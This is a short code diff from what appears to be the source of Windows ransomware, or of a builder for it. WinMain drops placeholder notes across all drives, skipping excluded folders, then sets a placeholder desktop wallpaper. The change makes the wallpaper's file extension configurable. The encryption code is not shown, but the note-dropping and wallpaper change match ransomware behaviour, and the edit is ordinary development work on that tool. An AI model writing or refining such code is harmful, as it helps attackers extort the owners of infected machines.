@@ -425,7 +425,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     std::string note_content = NOTE_CONTENT_PLACEHOLDER;
     drop_notes(drives, exclude_folders, note_name, note_content);
     
-    set_wallpaper(WALLPAPER_PLACEHOLDER, ".jpg");
+    set_wallpaper(WALLPAPER_PLACEHOLDER, CONFIG["wallpaper_ext"].c_str());
     
     return 0;
 }
